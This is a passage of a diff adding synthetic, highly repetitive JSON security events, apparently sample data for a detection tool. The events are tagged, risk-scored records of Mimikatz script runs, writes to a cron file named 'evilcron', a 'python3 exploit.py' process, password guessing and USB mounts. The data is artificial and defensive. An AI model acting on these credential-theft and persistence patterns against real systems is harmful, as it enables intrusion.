+      "cron_abuse"
+    ],
+    "timestamp": 1749479364.058206,
+    "event_id": "evt-100189"
+  },
+  {
+    "event_type": "process_start",
+    "exe": "/usr/bin/python3",
+    "cmdline": "python3 exploit.py",
+    "user": "attacker",
+    "pid": 4434,
+    "ppid": 1904,
+    "risk_score": 85,
+    "tags": [
+      "suspicious_execution",
+      "living_off_the_land",
+      "python_execution"
+    ],
+    "timestamp": 1749466635.058208,
+    "event_id": "evt-100190"
+  },
+  {
+    "event_type": "usb_event",
+    "device_id": "USB\\VID_1234&PID_5678",
+    "mount_path": "/Volumes/SECRET",
+    "user": "analyst",
+    "risk_score": 60,
+    "tags": [
+      "usb_mount",
+      "data_exfil_risk"
+    ],
+    "timestamp": 1749475510.05821,
+    "event_id": "evt-100191"
+  },
+  {
+    "event_type": "script_execution",
+    "script": "Invoke-Mimikatz.ps1",
+    "user": "domain_user",
+    "host": "macbook.local",
+    "risk_score": 95,
+    "tags": [
+      "credential_access",
+      "powershell_abuse",
+      "evasion"
+    ],
+    "timestamp": 1749501106.058213,
+    "event_id": "evt-100192"
+  },
+  {
+    "event_type": "file_modification",
+    "path": "/etc/cron.d/evilcron",
+    "operation": "write",
+    "user": "root",
+    "risk_score": 90,
+    "tags": [
+      "persistence_mechanism",
+      "cron_abuse"
+    ],
+    "timestamp": 1749435126.058215,
+    "event_id": "evt-100193"
+  },
+  {
+    "event_type": "usb_event",
+    "device_id": "USB\\VID_1234&PID_5678",
+    "mount_path": "/Volumes/SECRET",
+    "user": "analyst",
+    "risk_score": 60,
+    "tags": [
+      "usb_mount",
+      "data_exfil_risk"
+    ],
+    "timestamp": 1749493114.058217,
+    "event_id": "evt-100194"
+  },
+  {
+    "event_type": "script_execution",
+    "script": "Invoke-Mimikatz.ps1",
+    "user": "domain_user",
+    "host": "macbook.local",
+    "risk_score": 95,
+    "tags": [
+      "credential_access",
+      "powershell_abuse",
+      "evasion"
+    ],
+    "timestamp": 1749469487.05822,
+    "event_id": "evt-100195"
+  },
+  {
+    "event_type": "usb_event",
+    "device_id": "USB\\VID_1234&PID_5678",
+    "mount_path": "/Volumes/SECRET",
+    "user": "analyst",
+    "risk_score": 60,
+    "tags": [
+      "usb_mount",
+      "data_exfil_risk"
+    ],
+    "timestamp": 1749472981.058222,
+    "event_id": "evt-100196"
+  },
+  {
+    "event_type": "auth_attempt",
+    "user": "admin",
+    "source_ip": "10.0.0.13",
+    "method": "password_guess",
+    "success": false,
+    "risk_score": 75,
+    "tags": [
+      "brute_force",
+      "failed_auth"
+    ],
+    "timestamp": 1749451938.058224,
+    "event_id": "evt-100197"
+  },
+  {
+    "event_type": "file_modification",
+    "path": "/etc/cron.d/evilcron",
+    "operation": "write",
+    "user": "root",
+    "risk_score": 90,
+    "tags": [
+      "persistence_mechanism",
+      "cron_abuse"
+    ],
+    "timestamp": 1749468380.058226,
+    "event_id": "evt-100198"
+  },
+  {
+    "event_type": "auth_attempt",
+    "user": "admin",
+    "source_ip": "10.0.0.13",
+    "method": "password_guess",
+    "success": false,
+    "risk_score": 75,
+    "tags": [
+      "brute_force",
+      "failed_auth"
+    ],
+    "timestamp": 1749428661.058229,
+    "event_id": "evt-100199"
+  },
+  {
+    "event_type": "file_modification",
+    "path": "/etc/cron.d/evilcron",
+    "operation": "write",
+    "user": "root",
+    "risk_score": 90,
+    "tags": [
+      "persistence_mechanism",
+      "cron_abuse"
+    ],
+    "timestamp": 1749488176.058231,
+    "event_id": "evt-100200"
+  },
+  {
+    "event_type": "file_modification",
+    "path": "/etc/cron.d/evilcron",
+    "operation": "write",
+    "user": "root",
+    "risk_score": 90,
+    "tags": [
+      "persistence_mechanism",
+      "cron_abuse"
+    ],
+    "timestamp": 1749467210.058233,
+    "event_id": "evt-100201"
+  },
+  {
+    "event_type": "script_execution",
+    "script": "Invoke-Mimikatz.ps1",
+    "user": "domain_user",
+    "host": "macbook.local",
+    "risk_score": 95,
+    "tags": [
+      "credential_access",
+      "powershell_abuse",
+      "evasion"
+    ],
+    "timestamp": 1749501473.058236,
+    "event_id": "evt-100202"
+  },
+  {
+    "event_type": "network_connection",
+    "src_ip": "192.168.1.20",
+    "dst_ip": "8.8.8.8",
+    "dst_port": 53,
+    "protocol": "UDP",
+    "risk_score": 10,
+    "tags": [
+      "dns_traffic"
+    ],
+    "timestamp": 1749441431.058242,
+    "event_id": "evt-100203"
+  },
+  {
+    "event_type": "script_execution",
+    "script": "Invoke-Mimikatz.ps1",
+    "user": "domain_user",
+    "host": "macbook.local",
+    "risk_score": 95,
+    "tags": [
+      "credential_access",
+      "powershell_abuse",
+      "evasion"
+    ],
+    "timestamp": 1749489478.058244,
+    "event_id": "evt-100204"
+  },
+  {
+    "event_type": "script_execution",
+    "script": "Invoke-Mimikatz.ps1",
+    "user": "domain_user",
+    "host": "macbook.local",
+    "risk_score": 95,
+    "tags": [
+      "credential_access",
+      "powershell_abuse",
+      "evasion"
+    ],
+    "timestamp": 1749517384.058246,
+    "event_id": "evt-100205"
+  },
+  {
+    "event_type": "network_connection",
+    "src_ip": "192.168.1.20",
+    "dst_ip": "8.8.8.8",
+    "dst_port": 53,
+    "protocol": "UDP",
+    "risk_score": 10,
+    "tags": [
+      "dns_traffic"
+    ],
+    "timestamp": 1749429863.058248,
+    "event_id": "evt-100206"
+  },
+  {
+    "event_type": "usb_event",
+    "device_id": "USB\\VID_1234&PID_5678",
+    "mount_path": "/Volumes/SECRET",
+    "user": "analyst",
+    "risk_score": 60,
+    "tags": [
+      "usb_mount",
+      "data_exfil_risk"
+    ],
+    "timestamp": 1749496399.05825,
+    "event_id": "evt-100207"
+  },
+  {
+    "event_type": "process_start",
+    "exe": "/usr/bin/python3",
+    "cmdline": "python3 exploit.py",
+    "user": "attacker",
+    "pid": 4434,
+    "ppid": 1904,
+    "risk_score": 85,
+    "tags": [
+      "suspicious_execution",
+      "living_off_the_land",
+      "python_execution"
+    ],
+    "timestamp": 1749509817.058253,
+    "event_id": "evt-100208"
+  },
+  {
+    "event_type": "usb_event",
+    "device_id": "USB\\VID_1234&PID_5678",
+    "mount_path": "/Volumes/SECRET",
+    "user": "analyst",
+    "risk_score": 60,
+    "tags": [
+      "usb_mount",
+      "data_exfil_risk"
+    ],
+    "timestamp": 1749431269.058255,
+    "event_id": "evt-100209"
+  },
+  {
+    "event_type": "auth_attempt",
+    "user": "admin",
+    "source_ip": "10.0.0.13",
+    "method": "password_guess",
+    "success": false,
+    "risk_score": 75,
+    "tags": [
+      "brute_force",
+      "failed_auth"
+    ],
+    "timestamp": 1749516118.058257,
+    "event_id": "evt-100210"
+  },
+  {
+    "event_type": "auth_attempt",
+    "user": "admin",
+    "source_ip": "10.0.0.13",
+    "method": "password_guess",
+    "success": false,
+    "risk_score": 75,
+    "tags": [
+      "brute_force",
+      "failed_auth"
+    ],
+    "timestamp": 1749463370.058259,
+    "event_id": "evt-100211"
+  },
+  {
+    "event_type": "usb_event",
+    "device_id": "USB\\VID_1234&PID_5678",
+    "mount_path": "/Volumes/SECRET",
+    "user": "analyst",
+    "risk_score": 60,
+    "tags": [
+      "usb_mount",
+      "data_exfil_risk"
+    ],
+    "timestamp": 1749501124.058261,
+    "event_id": "evt-100212"
+  },
+  {
+    "event_type": "network_connection",
+    "src_ip": "192.168.1.20",
+    "dst_ip": "8.8.8.8",
+    "dst_port": 53,
+    "protocol": "UDP",
+    "risk_score": 10,
+    "tags": [
+      "dns_traffic"
+    ],
+    "timestamp": 1749463519.058264,
+    "event_id": "evt-100213"
+  },
+  {
+    "event_type": "process_start",
+    "exe": "/usr/bin/python3",
+    "cmdline": "python3 exploit.py",
+    "user": "attacker",
+    "pid": 4434,
+    "ppid": 1904,
+    "risk_score": 85,
+    "tags": [
+      "suspicious_execution",
+      "living_off_the_land",
+      "python_execution"
+    ],
+    "timestamp": 1749448666.058266,
+    "event_id": "evt-100214"
+  },
+  {
+    "event_type": "file_modification",
+    "path": "/etc/cron.d/evilcron",
+    "operation": "write",
+    "user": "root",
+    "risk_score": 90,
+    "tags": [
+      "persistence_mechanism",
+      "cron_abuse"
+    ],
+    "timestamp": 1749447887.058268,
+    "event_id": "evt-100215"
+  },
+  {
+    "event_type": "usb_event",
+    "device_id": "USB\\VID_1234&PID_5678",
+    "mount_path": "/Volumes/SECRET",
+    "user": "analyst",
+    "risk_score": 60,
+    "tags": [
+      "usb_mount",
+      "data_exfil_risk"
+    ],
+    "timestamp": 1749517625.05827,
+    "event_id": "evt-100216"
+  },
+  {
+    "event_type": "auth_attempt",
+    "user": "admin",
+    "source_ip": "10.0.0.13",
+    "method": "password_guess",
+    "success": false,
+    "risk_score": 75,
+    "tags": [
+      "brute_force",
+      "failed_auth"
+    ],
+    "timestamp": 1749494718.058273,
+    "event_id": "evt-100217"
+  },
+  {
+    "event_type": "process_start",
+    "exe": "/usr/bin/python3",
+    "cmdline": "python3 exploit.py",
+    "user": "attacker",
+    "pid": 4434,
+    "ppid": 1904,
+    "risk_score": 85,
+    "tags": [
+      "suspicious_execution",
+      "living_off_the_land",
+      "python_execution"
+    ],
+    "timestamp": 1749517120.058275,
+    "event_id": "evt-100218"
+  },
+  {
+    "event_type": "auth_attempt",
+    "user": "admin",
+    "source_ip": "10.0.0.13",
+    "method": "password_guess",
+    "success": false,
+    "risk_score": 75,
+    "tags": [
+      "brute_force",
+      "failed_auth"
+    ],
+    "timestamp": 1749491159.058277,
+    "event_id": "evt-100219"
+  },
+  {
+    "event_type": "process_start",
+    "exe": "/usr/bin/python3",
+    "cmdline": "python3 exploit.py",
+    "user": "attacker",
+    "pid": 4434,
+    "ppid": 1904,
+    "risk_score": 85,
+    "tags": [
+      "suspicious_execution",
+      "living_off_the_land",
+      "python_execution"
+    ],
+    "timestamp": 1749440101.058279,
+    "event_id": "evt-100220"
+  },
+  {
+    "event_type": "usb_event",
+    "device_id": "USB\\VID_1234&PID_5678",
+    "mount_path": "/Volumes/SECRET",
+    "user": "analyst",
+    "risk_score": 60,
+    "tags": [
+      "usb_mount",
+      "data_exfil_risk"
+    ],
+    "timestamp": 1749424271.058282,
+    "event_id": "evt-100221"
+  },
+  {
+    "event_type": "auth_attempt",
+    "user": "admin",
+    "source_ip": "10.0.0.13",
+    "method": "password_guess",
+    "success": false,
+    "risk_score": 75,
+    "tags": [
+      "brute_force",
+      "failed_auth"
+    ],
+    "timestamp": 1749489119.058284,
+    "event_id": "evt-100222"
+  },
+  {
+    "event_type": "script_execution",
+    "script": "Invoke-Mimikatz.ps1",
+    "user": "domain_user",
+    "host": "macbook.local",
+    "risk_score": 95,
+    "tags": [
+      "credential_access",
+      "powershell_abuse",
+      "evasion"
+    ],
+    "timestamp": 1749509303.058288,
+    "event_id": "evt-100223"
+  },
+  {
+    "event_type": "file_modification",
+    "path": "/etc/cron.d/evilcron",
+    "operation": "write",
+    "user": "root",
+    "risk_score": 90,
+    "tags": [
+      "persistence_mechanism",
+      "cron_abuse"
+    ],
+    "timestamp": 1749473369.058291,
+    "event_id": "evt-100224"
+  },
+  {
+    "event_type": "script_execution",
+    "script": "Invoke-Mimikatz.ps1",
+    "user": "domain_user",
+    "host": "macbook.local",
+    "risk_score": 95,
+    "tags": [
+      "credential_access",
+      "powershell_abuse",
+      "evasion"
+    ],
+    "timestamp": 1749447219.058295,
+    "event_id": "evt-100225"
+  },
+  {
+    "event_type": "auth_attempt",
+    "user": "admin",
+    "source_ip": "10.0.0.13",
+    "method": "password_guess",
+    "success": false,
+    "risk_score": 75,
+    "tags": [
+      "brute_force",
+      "failed_auth"
+    ],
+    "timestamp": 1749434093.0583,
+    "event_id": "evt-100226"
+  },
+  {
+    "event_type": "usb_event",
+    "device_id": "USB\\VID_1234&PID_5678",
+    "mount_path": "/Volumes/SECRET",
+    "user": "analyst",
+    "risk_score": 60,
+    "tags": [
+      "usb_mount",
+      "data_exfil_risk"
+    ],
+    "timestamp": 1749471683.058304,
+    "event_id": "evt-100227"
+  },
+  {
+    "event_type": "script_execution",
+    "script": "Invoke-Mimikatz.ps1",
+    "user": "domain_user",
+    "host": "macbook.local",
+    "risk_score": 95,
+    "tags": [
+      "credential_access",
+      "powershell_abuse",
+      "evasion"
+    ],
+    "timestamp": 1749459735.058308,
+    "event_id": "evt-100228"
+  },
+  {
+    "event_type": "file_modification",
+    "path": "/etc/cron.d/evilcron",
+    "operation": "write",
+    "user": "root",
+    "risk_score": 90,
+    "tags": [
+      "persistence_mechanism",
+      "cron_abuse"
+    ],
+    "timestamp": 1749493631.058312,
+    "event_id": "evt-100229"
+  },
+  {
+    "event_type": "usb_event",
+    "device_id": "USB\\VID_1234&PID_5678",
+    "mount_path": "/Volumes/SECRET",
+    "user": "analyst",
+    "risk_score": 60,
+    "tags": [
+      "usb_mount",
+      "data_exfil_risk"
+    ],
+    "timestamp": 1749480325.058316,
+    "event_id": "evt-100230"
+  },
+  {
+    "event_type": "script_execution",
+    "script": "Invoke-Mimikatz.ps1",
+    "user": "domain_user",
+    "host": "macbook.local",
+    "risk_score": 95,
+    "tags": [
+      "credential_access",
+      "powershell_abuse",
+      "evasion"
+    ],
+    "timestamp": 1749512047.058319,
+    "event_id": "evt-100231"
+  },
+  {
+    "event_type": "file_modification",
+    "path": "/etc/cron.d/evilcron",
+    "operation": "write",
+    "user": "root",
+    "risk_score": 90,
+    "tags": [
+      "persistence_mechanism",
+      "cron_abuse"
+    ],
+    "timestamp": 1749471832.058321,
+    "event_id": "evt-100232"
+  },
+  {
+    "event_type": "file_modification",
+    "path": "/etc/cron.d/evilcron",
+    "operation": "write",
+    "user": "root",
+    "risk_score": 90,
+    "tags": [
+      "persistence_mechanism",
+      "cron_abuse"
+    ],
+    "timestamp": 1749443639.058324,
+    "event_id": "evt-100233"
+  },
+  {
+    "event_type": "script_execution",
+    "script": "Invoke-Mimikatz.ps1",
+    "user": "domain_user",
+    "host": "macbook.local",
+    "risk_score": 95,
+    "tags": [
+      "credential_access",
+      "powershell_abuse",
+      "evasion"
+    ],
+    "timestamp": 1749492123.058326,
+    "event_id": "evt-100234"
+  },
+  {
+    "event_type": "usb_event",
+    "device_id": "USB\\VID_1234&PID_5678",
+    "mount_path": "/Volumes/SECRET",
+    "user": "analyst",
+    "risk_score": 60,
+    "tags": [
+      "usb_mount",
+      "data_exfil_risk"
+    ],
+    "timestamp": 1749447734.058328,
+    "event_id": "evt-100235"
+  },
+  {
+    "event_type": "script_execution",
+    "script": "Invoke-Mimikatz.ps1",
+    "user": "domain_user",
+    "host": "macbook.local",
+    "risk_score": 95,
+    "tags": [
+      "credential_access",
+      "powershell_abuse",
+      "evasion"
+    ],
+    "timestamp": 1749491880.05833,
+    "event_id": "evt-100236"
+  },
+  {
+    "event_type": "usb_event",
+    "device_id": "USB\\VID_1234&PID_5678",
+    "mount_path": "/Volumes/SECRET",
+    "user": "analyst",
+    "risk_score": 60,
+    "tags": [
+      "usb_mount",
+      "data_exfil_risk"
+    ],
+    "timestamp": 1749448974.058332,
+    "event_id": "evt-100237"
+  },
+  {
+    "event_type": "process_start",
+    "exe": "/usr/bin/python3",
+    "cmdline": "python3 exploit.py",
+    "user": "attacker",
+    "pid": 4434,
+    "ppid": 1904,
+    "risk_score": 85,
+    "tags": [
+      "suspicious_execution",
+      "living_off_the_land",
+      "python_execution"
+    ],
+    "timestamp": 1749440707.058334,
+    "event_id": "evt-100238"
+  },
+  {
+    "event_type": "file_modification",
+    "path": "/etc/cron.d/evilcron",
+    "operation": "write",
+    "user": "root",
+    "risk_score": 90,
+    "tags": [
+      "persistence_mechanism",
+      "cron_abuse"
+    ],
+    "timestamp": 1749461682.058337,
+    "event_id": "evt-100239"
+  },
+  {
+    "event_type": "auth_attempt",
+    "user": "admin",
+    "source_ip": "10.0.0.13",
+    "method": "password_guess",
+    "success": false,
+    "risk_score": 75,
+    "tags": [
+      "brute_force",
+      "failed_auth"
+    ],
+    "timestamp": 1749470552.058339,
+    "event_id": "evt-100240"
+  },
+  {
+    "event_type": "process_start",
+    "exe": "/usr/bin/python3",
+    "cmdline": "python3 exploit.py",
+    "user": "attacker",
+    "pid": 4434,
+    "ppid": 1904,
+    "risk_score": 85,
+    "tags": [
+      "suspicious_execution",
+      "living_off_the_land",
+      "python_execution"
+    ],
+    "timestamp": 1749491283.058341,
+    "event_id": "evt-100241"
+  },
+  {
+    "event_type": "usb_event",
+    "device_id": "USB\\VID_1234&PID_5678",
+    "mount_path": "/Volumes/SECRET",
+    "user": "analyst",
+    "risk_score": 60,
+    "tags": [
+      "usb_mount",
+      "data_exfil_risk"
+    ],
+    "timestamp": 1749446506.058343,
+    "event_id": "evt-100242"
+  },
+  {
+    "event_type": "usb_event",
+    "device_id": "USB\\VID_1234&PID_5678",
+    "mount_path": "/Volumes/SECRET",
+    "user": "analyst",
+    "risk_score": 60,
+    "tags": [
+      "usb_mount",
+      "data_exfil_risk"
+    ],
+    "timestamp": 1749466594.058345,
+    "event_id": "evt-100243"
+  },
+  {
+    "event_type": "usb_event",
+    "device_id": "USB\\VID_1234&PID_5678",
+    "mount_path": "/Volumes/SECRET",
+    "user": "analyst",
+    "risk_score": 60,
+    "tags": [
+      "usb_mount",
+      "data_exfil_risk"
+    ],
+    "timestamp": 1749479982.058348,
+    "event_id": "evt-100244"
+  },
+  {
+    "event_type": "usb_event",
+    "device_id": "USB\\VID_1234&PID_5678",
+    "mount_path": "/Volumes/SECRET",
+    "user": "analyst",
+    "risk_score": 60,
+    "tags": [
+      "usb_mount",
+      "data_exfil_risk"
+    ],
+    "timestamp": 1749436252.05835,
+    "event_id": "evt-100245"
+  },
+  {
+    "event_type": "process_start",
+    "exe": "/usr/bin/python3",
+    "cmdline": "python3 exploit.py",
+    "user": "attacker",
+    "pid": 4434,
+    "ppid": 1904,
+    "risk_score": 85,
+    "tags": [
+      "suspicious_execution",
+      "living_off_the_land",
+      "python_execution"
+    ],
+    "timestamp": 1749501220.058352,
+    "event_id": "evt-100246"
+  },
+  {
+    "event_type": "file_modification",
+    "path": "/etc/cron.d/evilcron",
+    "operation": "write",
+    "user": "root",
+    "risk_score": 90,
+    "tags": [
+      "persistence_mechanism",
+      "cron_abuse"
+    ],
+    "timestamp": 1749494657.058354,
+    "event_id": "evt-100247"
+  },
+  {
+    "event_type": "auth_attempt",
+    "user": "admin",
+    "source_ip": "10.0.0.13",
+    "method": "password_guess",
+    "success": false,
+    "risk_score": 75,
+    "tags": [
+      "brute_force",
+      "failed_auth"
+    ],
+    "timestamp": 1749450263.058356,
+    "event_id": "evt-100248"
+  },
+  {
+    "event_type": "file_modification",
+    "path": "/etc/cron.d/evilcron",
+    "operation": "write",
+    "user": "root",
+    "risk_score": 90,
+    "tags": [
+      "persistence_mechanism",
+      "cron_abuse"
+    ],
+    "timestamp": 1749421658.058359,
+    "event_id": "evt-100249"
+  },
+  {
+    "event_type": "auth_attempt",
+    "user": "admin",
+    "source_ip": "10.0.0.13",
+    "method": "password_guess",
+    "success": false,
+    "risk_score": 75,
+    "tags": [
+      "brute_force",
+      "failed_auth"
+    ],
+    "timestamp": 1749504054.058361,
+    "event_id": "evt-100250"
+  },
+  {
+    "event_type": "file_modification",
+    "path": "/etc/cron.d/evilcron",
+    "operation": "write",
+    "user": "root",
+    "risk_score": 90,
+    "tags": [
+      "persistence_mechanism",
+      "cron_abuse"
+    ],
+    "timestamp": 1749506427.058363,
+    "event_id": "evt-100251"
+  },
+  {
+    "event_type": "network_connection",
+    "src_ip": "192.168.1.20",
+    "dst_ip": "8.8.8.8",
+    "dst_port": 53,
+    "protocol": "UDP",
+    "risk_score": 10,
+    "tags": [
+      "dns_traffic"
+    ],
+    "timestamp": 1749512245.058365,
+    "event_id": "evt-100252"
+  },
+  {
+    "event_type": "auth_attempt",
+    "user": "admin",
+    "source_ip": "10.0.0.13",
+    "method": "password_guess",
+    "success": false,
+    "risk_score": 75,
+    "tags": [
+      "brute_force",
+      "failed_auth"
+    ],
+    "timestamp": 1749481126.058368,
+    "event_id": "evt-100253"
+  },
+  {
+    "event_type": "usb_event",
+    "device_id": "USB\\VID_1234&PID_5678",
+    "mount_path": "/Volumes/SECRET",
+    "user": "analyst",
+    "risk_score": 60,
+    "tags": [
+      "usb_mount",
+      "data_exfil_risk"
+    ],
+    "timestamp": 1749512300.058521,
+    "event_id": "evt-100254"
+  },
+  {
+    "event_type": "usb_event",
+    "device_id": "USB\\VID_1234&PID_5678",
+    "mount_path": "/Volumes/SECRET",
+    "user": "analyst",
+    "risk_score": 60,
+    "tags": [
+      "usb_mount",
+      "data_exfil_risk"
+    ],
+    "timestamp": 1749477024.058525,
+    "event_id": "evt-100255"
+  },
+  {
+    "event_type": "network_connection",
+    "src_ip": "192.168.1.20",
+    "dst_ip": "8.8.8.8",
+    "dst_port": 53,
+    "protocol": "UDP",
+    "risk_score": 10,
+    "tags": [
+      "dns_traffic"
+    ],
+    "timestamp": 1749427995.058528,
+    "event_id": "evt-100256"
+  },
+  {
+    "event_type": "auth_attempt",
+    "user": "admin",
+    "source_ip": "10.0.0.13",
+    "method": "password_guess",
+    "success": false,
+    "risk_score": 75,
+    "tags": [
+      "brute_force",
+      "failed_auth"
+    ],
+    "timestamp": 1749501929.058531,
+    "event_id": "evt-100257"
+  },
+  {
+    "event_type": "process_start",
+    "exe": "/usr/bin/python3",
+    "cmdline": "python3 exploit.py",
+    "user": "attacker",
+    "pid": 4434,
+    "ppid": 1904,
+    "risk_score": 85,
+    "tags": [
+      "suspicious_execution",
+      "living_off_the_land",
+      "python_execution"
+    ],
+    "timestamp": 1749475084.058533,
+    "event_id": "evt-100258"
+  },
+  {
+    "event_type": "auth_attempt",
+    "user": "admin",
+    "source_ip": "10.0.0.13",
+    "method": "password_guess",
+    "success": false,
+    "risk_score": 75,
+    "tags": [
+      "brute_force",
+      "failed_auth"
+    ],
+    "timestamp": 1749428964.058536,
+    "event_id": "evt-100259"
+  },
+  {
+    "event_type": "network_connection",
+    "src_ip": "192.168.1.20",
+    "dst_ip": "8.8.8.8",
+    "dst_port": 53,
+    "protocol": "UDP",
+    "risk_score": 10,
+    "tags": [
+      "dns_traffic"
+    ],
+    "timestamp": 1749499326.058538,
+    "event_id": "evt-100260"
+  },
+  {
+    "event_type": "usb_event",
+    "device_id": "USB\\VID_1234&PID_5678",
+    "mount_path": "/Volumes/SECRET",
+    "user": "analyst",
+    "risk_score": 60,
+    "tags": [
+      "usb_mount",
+      "data_exfil_risk"
+    ],
+    "timestamp": 1749477936.05854,
+    "event_id": "evt-100261"
+  },
+  {
+    "event_type": "process_start",
+    "exe": "/usr/bin/python3",
+    "cmdline": "python3 exploit.py",
+    "user": "attacker",
+    "pid": 4434,
+    "ppid": 1904,
+    "risk_score": 85,
+    "tags": [
+      "suspicious_execution",
+      "living_off_the_land",
+      "python_execution"
+    ],
+    "timestamp": 1749493715.058542,
+    "event_id": "evt-100262"
+  },
+  {
+    "event_type": "network_connection",
+    "src_ip": "192.168.1.20",
+    "dst_ip": "8.8.8.8",
+    "dst_port": 53,
+    "protocol": "UDP",
+    "risk_score": 10,
+    "tags": [
+      "dns_traffic"
+    ],
+    "timestamp": 1749444214.058545,
+    "event_id": "evt-100263"
+  },
+  {
+    "event_type": "network_connection",
+    "src_ip": "192.168.1.20",
+    "dst_ip": "8.8.8.8",
+    "dst_port": 53,
+    "protocol": "UDP",
+    "risk_score": 10,
+    "tags": [
+      "dns_traffic"
+    ],
+    "timestamp": 1749423932.058548,
+    "event_id": "evt-100264"
+  },
+  {
+    "event_type": "file_modification",
+    "path": "/etc/cron.d/evilcron",
+    "operation": "write",
+    "user": "root",
+    "risk_score": 90,
+    "tags": [
+      "persistence_mechanism",
+      "cron_abuse"
+    ],
+    "timestamp": 1749502066.05855,
+    "event_id": "evt-100265"
+  },
+  {
+    "event_type": "process_start",
+    "exe": "/usr/bin/python3",
+    "cmdline": "python3 exploit.py",
+    "user": "attacker",
+    "pid": 4434,
+    "ppid": 1904,
+    "risk_score": 85,
+    "tags": [
+      "suspicious_execution",
+      "living_off_the_land",
+      "python_execution"
+    ],
+    "timestamp": 1749423876.058552,
+    "event_id": "evt-100266"
+  },
+  {
+    "event_type": "script_execution",
+    "script": "Invoke-Mimikatz.ps1",
+    "user": "domain_user",
+    "host": "macbook.local",
+    "risk_score": 95,
+    "tags": [
+      "credential_access",
+      "powershell_abuse",
+      "evasion"
+    ],
+    "timestamp": 1749499003.058555,
+    "event_id": "evt-100267"
+  },
+  {
+    "event_type": "network_connection",
+    "src_ip": "192.168.1.20",
+    "dst_ip": "8.8.8.8",
+    "dst_port": 53,
+    "protocol": "UDP",
+    "risk_score": 10,
+    "tags": [
+      "dns_traffic"
+    ],
+    "timestamp": 1749495024.058557,
+    "event_id": "evt-100268"
+  },
+  {
+    "event_type": "auth_attempt",
+    "user": "admin",
+    "source_ip": "10.0.0.13",
+    "method": "password_guess",
+    "success": false,
+    "risk_score": 75,
+    "tags": [
+      "brute_force",
+      "failed_auth"
+    ],
+    "timestamp": 1749487413.05856,
+    "event_id": "evt-100269"
+  },
+  {
+    "event_type": "network_connection",
+    "src_ip": "192.168.1.20",
+    "dst_ip": "8.8.8.8",
+    "dst_port": 53,
+    "protocol": "UDP",
+    "risk_score": 10,
+    "tags": [
+      "dns_traffic"
+    ],
+    "timestamp": 1749476514.058562,
+    "event_id": "evt-100270"
+  },
+  {
+    "event_type": "file_modification",
+    "path": "/etc/cron.d/evilcron",
+    "operation": "write",
+    "user": "root",
+    "risk_score": 90,
+    "tags": [
+      "persistence_mechanism",
+      "cron_abuse"
+    ],
+    "timestamp": 1749452802.058565,
+    "event_id": "evt-100271"
+  },
+  {
+    "event_type": "auth_attempt",
+    "user": "admin",
+    "source_ip": "10.0.0.13",
+    "method": "password_guess",
+    "success": false,
+    "risk_score": 75,
+    "tags": [
+      "brute_force",
+      "failed_auth"
+    ],
+    "timestamp": 1749464539.058567,
+    "event_id": "evt-100272"
+  },
+  {
+    "event_type": "file_modification",
+    "path": "/etc/cron.d/evilcron",
+    "operation": "write",
+    "user": "root",
+    "risk_score": 90,
+    "tags": [
+      "persistence_mechanism",
+      "cron_abuse"
+    ],
+    "timestamp": 1749443736.058569,
+    "event_id": "evt-100273"
+  },
+  {
+    "event_type": "script_execution",
+    "script": "Invoke-Mimikatz.ps1",
+    "user": "domain_user",
+    "host": "macbook.local",
+    "risk_score": 95,
+    "tags": [
+      "credential_access",
+      "powershell_abuse",
+      "evasion"
+    ],
+    "timestamp": 1749422923.058571,
+    "event_id": "evt-100274"
+  },
+  {
+    "event_type": "file_modification",
+    "path": "/etc/cron.d/evilcron",
+    "operation": "write",
+    "user": "root",
+    "risk_score": 90,
+    "tags": [
+      "persistence_mechanism",
+      "cron_abuse"
+    ],
+    "timestamp": 1749491103.058573,
+    "event_id": "evt-100275"
+  },
+  {
+    "event_type": "file_modification",
+    "path": "/etc/cron.d/evilcron",
+    "operation": "write",
+    "user": "root",
+    "risk_score": 90,
+    "tags": [
+      "persistence_mechanism",
+      "cron_abuse"
+    ],
+    "timestamp": 1749442196.058575,
+    "event_id": "evt-100276"
+  },
+  {
+    "event_type": "auth_attempt",
+    "user": "admin",
+    "source_ip": "10.0.0.13",
+    "method": "password_guess",
+    "success": false,
+    "risk_score": 75,
+    "tags": [
+      "brute_force",
+      "failed_auth"
+    ],
+    "timestamp": 1749479031.058578,
+    "event_id": "evt-100277"
+  },
+  {
+    "event_type": "script_execution",
+    "script": "Invoke-Mimikatz.ps1",
+    "user": "domain_user",
+    "host": "macbook.local",
+    "risk_score": 95,
+    "tags": [
+      "credential_access",
+      "powershell_abuse",
+      "evasion"
+    ],
+    "timestamp": 1749516020.05858,
+    "event_id": "evt-100278"
+  },
+  {
+    "event_type": "usb_event",
+    "device_id": "USB\\VID_1234&PID_5678",
+    "mount_path": "/Volumes/SECRET",
+    "user": "analyst",
+    "risk_score": 60,
+    "tags": [
+      "usb_mount",
+      "data_exfil_risk"
+    ],
+    "timestamp": 1749436249.058584,
+    "event_id": "evt-100279"
+  },
+  {
+    "event_type": "usb_event",
+    "device_id": "USB\\VID_1234&PID_5678",
+    "mount_path": "/Volumes/SECRET",
+    "user": "analyst",
+    "risk_score": 60,
+    "tags": [
+      "usb_mount",
+      "data_exfil_risk"
+    ],
+    "timestamp": 1749472875.058588,
+    "event_id": "evt-100280"
+  },
+  {
+    "event_type": "usb_event",
+    "device_id": "USB\\VID_1234&PID_5678",
+    "mount_path": "/Volumes/SECRET",
+    "user": "analyst",
+    "risk_score": 60,
+    "tags": [
+      "usb_mount",
+      "data_exfil_risk"
+    ],
+    "timestamp": 1749432721.058592,
+    "event_id": "evt-100281"
+  },
+  {
+    "event_type": "usb_event",
+    "device_id": "USB\\VID_1234&PID_5678",
+    "mount_path": "/Volumes/SECRET",
+    "user": "analyst",
+    "risk_score": 60,
+    "tags": [
+      "usb_mount",
+      "data_exfil_risk"
+    ],
+    "timestamp": 1749432075.058596,
+    "event_id": "evt-100282"
+  },
+  {
+    "event_type": "script_execution",
+    "script": "Invoke-Mimikatz.ps1",
+    "user": "domain_user",
+    "host": "macbook.local",
+    "risk_score": 95,
+    "tags": [
+      "credential_access",
+      "powershell_abuse",
+      "evasion"
+    ],
+    "timestamp": 1749430602.058599,
+    "event_id": "evt-100283"
+  },
+  {
+    "event_type": "process_start",
+    "exe": "/usr/bin/python3",
+    "cmdline": "python3 exploit.py",
+    "user": "attacker",
+    "pid": 4434,
+    "ppid": 1904,
+    "risk_score": 85,
+    "tags": [
+      "suspicious_execution",
+      "living_off_the_land",
+      "python_execution"
+    ],
+    "timestamp": 1749434154.058603,
+    "event_id": "evt-100284"
+  },
+  {
+    "event_type": "file_modification",
+    "path": "/etc/cron.d/evilcron",
+    "operation": "write",
+    "user": "root",
